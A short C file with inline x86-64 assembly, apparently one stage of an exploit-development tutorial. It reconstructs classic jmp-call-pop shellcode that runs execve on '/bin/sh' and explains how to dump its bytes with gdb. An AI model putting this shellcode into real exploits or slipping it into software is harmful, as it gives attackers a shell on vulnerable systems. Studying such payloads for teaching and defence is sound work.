/*
The assembly here is based on that extracted from disassembling shellcode.

To compile this asm and get the corresponding byte code, run:
make shellcode_asm && gdb shellcode_asm -ex="disassemble /r main"

Note that we cannot actually run this executable, because the code attempts to modify itself.
The OS will mark the code pages as read-only, and will not allow us to do this.
That's where the next stage, sc_stckex.c comes in...
*/


int main() {
    asm volatile(
        "jmp . + 41\n\t"
        "pop %rbp\n\t"
        "mov %rbp,0x8(%rbp)\n\t"
        "mov $0x0,0x10(%rbp)\n\t"
        "mov $0x0,%edx\n\t"
        "mov $0x3b,%eax\n\t"
        "lea 0x8(%rbp),%rsi\n\t"
        "mov 0x8(%rbp),%rdi\n\t"
        "syscall\n\t"
        "mov $0x0,%eax\n\t"
        "pop %rbp\n\t"
        "ret\n\t"
        "call . - 39\n\t"
        ".string \"/bin/sh\""
    );
}
